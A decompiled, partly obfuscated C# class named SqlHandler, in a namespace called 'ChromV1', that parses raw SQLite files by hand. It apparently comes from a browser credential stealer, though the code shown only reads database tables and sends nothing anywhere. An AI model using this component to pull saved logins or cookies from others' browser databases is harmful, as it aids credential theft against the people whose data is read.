using System;
using System.IO;
using System.Text;
using SmartAssembly.StringsEncoding;

namespace ChromV1
{
	// Token: 0x0200007F RID: 127
	internal sealed class SqlHandler
	{
		// Token: 0x060002B3 RID: 691 RVA: 0x00026BD0 File Offset: 0x00024DD0
		public SqlHandler(string string_0)
		{
			this._fileBytes = File.ReadAllBytes(string_0);
			this._pageSize = this.ConvertToULong(16, 2);
			this._dbEncoding = this.ConvertToULong(56, 4);
			this.ReadMasterTable(100L);
		}

		// Token: 0x060002B4 RID: 692 RVA: 0x00026C34 File Offset: 0x00024E34
		public string GetValue(int int_0, int int_1)
		{
			string result;
			try
			{
				if (int_0 >= this._tableEntries.Length)
				{
					result = null;
				}
				else
				{
					result = ((int_1 >= this._tableEntries[int_0].Content.Length) ? null : this._tableEntries[int_0].Content[int_1]);
				}
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x060002B5 RID: 693 RVA: 0x00009EC7 File Offset: 0x000080C7
		public int GetRowCount()
		{
			return this._tableEntries.Length;
		}

		// Token: 0x060002B6 RID: 694 RVA: 0x00026C9C File Offset: 0x00024E9C
		private bool ReadTableFromOffset(ulong ulong_0)
		{
			bool result;
			try
			{
				if (this._fileBytes[(int)(checked((IntPtr)ulong_0))] == 13)
				{
					uint num = (uint)(this.ConvertToULong((int)ulong_0 + 3, 2) - 1UL);
					int num2 = 0;
					if (this._tableEntries != null)
					{
						num2 = this._tableEntries.Length;
						Array.Resize<SqlHandler.TableEntry>(ref this._tableEntries, this._tableEntries.Length + (int)num + 1);
					}
					else
					{
						this._tableEntries = new SqlHandler.TableEntry[num + 1U];
					}
					for (uint num3 = 0U; num3 <= num; num3 += 1U)
					{
						ulong num4 = this.ConvertToULong((int)ulong_0 + 8 + (int)(num3 * 2U), 2);
						if (ulong_0 != 100UL)
						{
							num4 += ulong_0;
						}
						int num5 = this.Gvl((int)num4);
						this.Cvl((int)num4, num5);
						int num6 = this.Gvl((int)(num4 + (ulong)((long)num5 - (long)num4) + 1UL));
						this.Cvl((int)(num4 + (ulong)((long)num5 - (long)num4) + 1UL), num6);
						ulong num7 = num4 + (ulong)((long)num6 - (long)num4 + 1L);
						int num8 = this.Gvl((int)num7);
						int num9 = num8;
						long num10 = this.Cvl((int)num7, num8);
						SqlHandler.RecordHeaderField[] array = null;
						long num11 = (long)(num7 - (ulong)((long)num8) + 1UL);
						int num12 = 0;
						while (num11 < num10)
						{
							Array.Resize<SqlHandler.RecordHeaderField>(ref array, num12 + 1);
							int num13 = num9 + 1;
							num9 = this.Gvl(num13);
							array[num12].Type = this.Cvl(num13, num9);
							array[num12].Size = (long)((array[num12].Type <= 9L) ? ((ulong)this._sqlDataTypeSize[(int)(checked((IntPtr)array[num12].Type))]) : ((ulong)((!SqlHandler.IsOdd(array[num12].Type)) ? ((array[num12].Type - 12L) / 2L) : ((array[num12].Type - 13L) / 2L))));
							num11 = num11 + (long)(num9 - num13) + 1L;
							num12++;
						}
						if (array != null)
						{
							this._tableEntries[num2 + (int)num3].Content = new string[array.Length];
							int num14 = 0;
							for (int i = 0; i <= array.Length - 1; i++)
							{
								if (array[i].Type > 9L)
								{
									if (!SqlHandler.IsOdd(array[i].Type))
									{
										if (this._dbEncoding == 1UL)
										{
											this._tableEntries[num2 + (int)num3].Content[i] = Encoding.Default.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)((long)num14)), (int)array[i].Size);
										}
										else if (this._dbEncoding == 2UL)
										{
											this._tableEntries[num2 + (int)num3].Content[i] = Encoding.Unicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)((long)num14)), (int)array[i].Size);
										}
										else if (this._dbEncoding == 3UL)
										{
											this._tableEntries[num2 + (int)num3].Content[i] = Encoding.BigEndianUnicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)((long)num14)), (int)array[i].Size);
										}
									}
									else
									{
										this._tableEntries[num2 + (int)num3].Content[i] = Encoding.Default.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)((long)num14)), (int)array[i].Size);
									}
								}
								else
								{
									this._tableEntries[num2 + (int)num3].Content[i] = Convert.ToString(this.ConvertToULong((int)(num7 + (ulong)num10 + (ulong)((long)num14)), (int)array[i].Size));
								}
								num14 += (int)array[i].Size;
							}
						}
					}
				}
				else if (this._fileBytes[(int)(checked((IntPtr)ulong_0))] == 5)
				{
					uint num15 = (uint)(this.ConvertToULong((int)(ulong_0 + 3UL), 2) - 1UL);
					for (uint num16 = 0U; num16 <= num15; num16 += 1U)
					{
						uint num17 = (uint)this.ConvertToULong((int)ulong_0 + 12 + (int)(num16 * 2U), 2);
						this.ReadTableFromOffset((this.ConvertToULong((int)(ulong_0 + (ulong)num17), 4) - 1UL) * this._pageSize);
					}
					this.ReadTableFromOffset((this.ConvertToULong((int)(ulong_0 + 8UL), 4) - 1UL) * this._pageSize);
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x060002B7 RID: 695 RVA: 0x000271B0 File Offset: 0x000253B0
		private void ReadMasterTable(long long_0)
		{
			try
			{
				byte b = this._fileBytes[(int)(checked((IntPtr)long_0))];
				if (b != 5)
				{
					if (b == 13)
					{
						ulong num = this.ConvertToULong((int)long_0 + 3, 2) - 1UL;
						int num2 = 0;
						if (this._masterTableEntries != null)
						{
							num2 = this._masterTableEntries.Length;
							Array.Resize<SqlHandler.SqliteMasterEntry>(ref this._masterTableEntries, this._masterTableEntries.Length + (int)num + 1);
						}
						else
						{
							this._masterTableEntries = new SqlHandler.SqliteMasterEntry[num + 1UL];
						}
						for (ulong num3 = 0UL; num3 <= num; num3 += 1UL)
						{
							ulong num4 = this.ConvertToULong((int)long_0 + 8 + (int)num3 * 2, 2);
							if (long_0 != 100L)
							{
								num4 += (ulong)long_0;
							}
							int num5 = this.Gvl((int)num4);
							this.Cvl((int)num4, num5);
							int num6 = this.Gvl((int)(num4 + (ulong)((long)num5 - (long)num4) + 1UL));
							this.Cvl((int)(num4 + (ulong)((long)num5 - (long)num4) + 1UL), num6);
							ulong num7 = num4 + (ulong)((long)num6 - (long)num4 + 1L);
							int num8 = this.Gvl((int)num7);
							int num9 = num8;
							long num10 = this.Cvl((int)num7, num8);
							long[] array = new long[5];
							for (int i = 0; i <= 4; i++)
							{
								int int_ = num9 + 1;
								num9 = this.Gvl(int_);
								array[i] = this.Cvl(int_, num9);
								array[i] = (long)((array[i] <= 9L) ? ((ulong)this._sqlDataTypeSize[(int)(checked((IntPtr)array[i]))]) : ((ulong)((!SqlHandler.IsOdd(array[i])) ? ((array[i] - 12L) / 2L) : ((array[i] - 13L) / 2L))));
							}
							if (this._dbEncoding == 1UL || this._dbEncoding == 2UL)
							{
								if (this._dbEncoding == 1UL)
								{
									this._masterTableEntries[num2 + (int)num3].ItemName = Encoding.Default.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0]), (int)array[1]);
								}
								else if (this._dbEncoding == 2UL)
								{
									this._masterTableEntries[num2 + (int)num3].ItemName = Encoding.Unicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0]), (int)array[1]);
								}
								else if (this._dbEncoding == 3UL)
								{
									this._masterTableEntries[num2 + (int)num3].ItemName = Encoding.BigEndianUnicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0]), (int)array[1]);
								}
							}
							this._masterTableEntries[num2 + (int)num3].RootNum = (long)this.ConvertToULong((int)(num7 + (ulong)num10 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2]), (int)array[3]);
							if (this._dbEncoding == 1UL)
							{
								this._masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.Default.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
							}
							else if (this._dbEncoding == 2UL)
							{
								this._masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.Unicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
							}
							else if (this._dbEncoding == 3UL)
							{
								this._masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.BigEndianUnicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
							}
						}
					}
				}
				else
				{
					uint num11 = (uint)(this.ConvertToULong((int)long_0 + 3, 2) - 1UL);
					for (int j = 0; j <= (int)num11; j++)
					{
						uint num12 = (uint)this.ConvertToULong((int)long_0 + 12 + j * 2, 2);
						if (long_0 == 100L)
						{
							this.ReadMasterTable((long)((this.ConvertToULong((int)num12, 4) - 1UL) * this._pageSize));
						}
						else
						{
							this.ReadMasterTable((long)((this.ConvertToULong((int)(long_0 + (long)((ulong)num12)), 4) - 1UL) * this._pageSize));
						}
					}
					this.ReadMasterTable((long)((this.ConvertToULong((int)long_0 + 8, 4) - 1UL) * this._pageSize));
				}
			}
			catch
			{
			}
		}

		// Token: 0x060002B8 RID: 696 RVA: 0x000276B4 File Offset: 0x000258B4
		public bool ReadTable(string string_0)
		{
			bool result;
			try
			{
				int num = -1;
				int i = 0;
				while (i <= this._masterTableEntries.Length)
				{
					if (string.Compare(this._masterTableEntries[i].ItemName.ToLower(), string_0.ToLower(), StringComparison.Ordinal) != 0)
					{
						i++;
					}
					else
					{
						num = i;
						IL_3D:
						if (num == -1)
						{
							return false;
						}
						string[] array = this._masterTableEntries[num].SqlStatement.Substring(this._masterTableEntries[num].SqlStatement.IndexOf(Strings.Get(107394796), StringComparison.Ordinal) + 1).Split(new char[]
						{
							','
						});
						for (int j = 0; j <= array.Length - 1; j++)
						{
							array[j] = array[j].TrimStart(new char[0]);
							int num2 = array[j].IndexOf(' ');
							if (num2 > 0)
							{
								array[j] = array[j].Substring(0, num2);
							}
							if (array[j].IndexOf(Strings.Get(107394791), StringComparison.Ordinal) != 0)
							{
								Array.Resize<string>(ref this._fieldNames, j + 1);
								this._fieldNames[j] = array[j];
							}
						}
						return this.ReadTableFromOffset((ulong)((this._masterTableEntries[num].RootNum - 1L) * (long)this._pageSize));
					}
				}
				goto IL_3D;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x060002B9 RID: 697 RVA: 0x00027844 File Offset: 0x00025A44
		private ulong ConvertToULong(int int_0, int int_1)
		{
			ulong result;
			try
			{
				if (int_1 > 8 | int_1 == 0)
				{
					result = 0UL;
				}
				else
				{
					ulong num = 0UL;
					for (int i = 0; i <= int_1 - 1; i++)
					{
						num = (num << 8 | (ulong)this._fileBytes[int_0 + i]);
					}
					result = num;
				}
			}
			catch
			{
				result = 0UL;
			}
			return result;
		}

		// Token: 0x060002BA RID: 698 RVA: 0x000278B4 File Offset: 0x00025AB4
		private int Gvl(int int_0)
		{
			int result;
			try
			{
				if (int_0 > this._fileBytes.Length)
				{
					result = 0;
				}
				else
				{
					for (int i = int_0; i <= int_0 + 8; i++)
					{
						if (i > this._fileBytes.Length - 1)
						{
							return 0;
						}
						if ((this._fileBytes[i] & 128) != 128)
						{
							return i;
						}
					}
					result = int_0 + 8;
				}
			}
			catch
			{
				result = 0;
			}
			return result;
		}

		// Token: 0x060002BB RID: 699 RVA: 0x00027928 File Offset: 0x00025B28
		private long Cvl(int int_0, int int_1)
		{
			long result;
			try
			{
				int_1++;
				byte[] array = new byte[8];
				int num = int_1 - int_0;
				bool flag = false;
				if (num == 0 | num > 9)
				{
					result = 0L;
				}
				else if (num == 1)
				{
					array[0] = (this._fileBytes[int_0] & 127);
					result = BitConverter.ToInt64(array, 0);
				}
				else
				{
					if (num == 9)
					{
						flag = true;
					}
					int num2 = 1;
					int num3 = 7;
					int num4 = 0;
					if (flag)
					{
						array[0] = this._fileBytes[int_1 - 1];
						int_1--;
						num4 = 1;
					}
					for (int i = int_1 - 1; i >= int_0; i += -1)
					{
						if (i - 1 >= int_0)
						{
							array[num4] = (byte)((this._fileBytes[i] >> num2 - 1 & 255 >> num2) | (int)this._fileBytes[i - 1] << num3);
							num2++;
							num4++;
							num3--;
						}
						else if (!flag)
						{
							array[num4] = (byte)(this._fileBytes[i] >> num2 - 1 & 255 >> num2);
						}
					}
					result = BitConverter.ToInt64(array, 0);
				}
			}
			catch
			{
				result = 0L;
			}
			return result;
		}

		// Token: 0x060002BC RID: 700 RVA: 0x00008C97 File Offset: 0x00006E97
		private static bool IsOdd(long long_0)
		{
			return (long_0 & 1L) == 1L;
		}

		// Token: 0x0400017A RID: 378
		private readonly ulong _dbEncoding;

		// Token: 0x0400017B RID: 379
		private readonly byte[] _fileBytes;

		// Token: 0x0400017C RID: 380
		private readonly ulong _pageSize;

		// Token: 0x0400017D RID: 381
		private readonly byte[] _sqlDataTypeSize = new byte[]
		{
			0,
			1,
			2,
			3,
			4,
			6,
			8,
			8,
			0,
			0
		};

		// Token: 0x0400017E RID: 382
		private string[] _fieldNames;

		// Token: 0x0400017F RID: 383
		private SqlHandler.SqliteMasterEntry[] _masterTableEntries;

		// Token: 0x04000180 RID: 384
		private SqlHandler.TableEntry[] _tableEntries;

		// Token: 0x02000080 RID: 128
		private struct RecordHeaderField
		{
			// Token: 0x04000181 RID: 385
			public long Size;

			// Token: 0x04000182 RID: 386
			public long Type;
		}

		// Token: 0x02000081 RID: 129
		private struct TableEntry
		{
			// Token: 0x04000183 RID: 387
			public string[] Content;
		}

		// Token: 0x02000082 RID: 130
		private struct SqliteMasterEntry
		{
			// Token: 0x04000184 RID: 388
			public string ItemName;

			// Token: 0x04000185 RID: 389
			public long RootNum;

			// Token: 0x04000186 RID: 390
			public string SqlStatement;
		}
	}
}
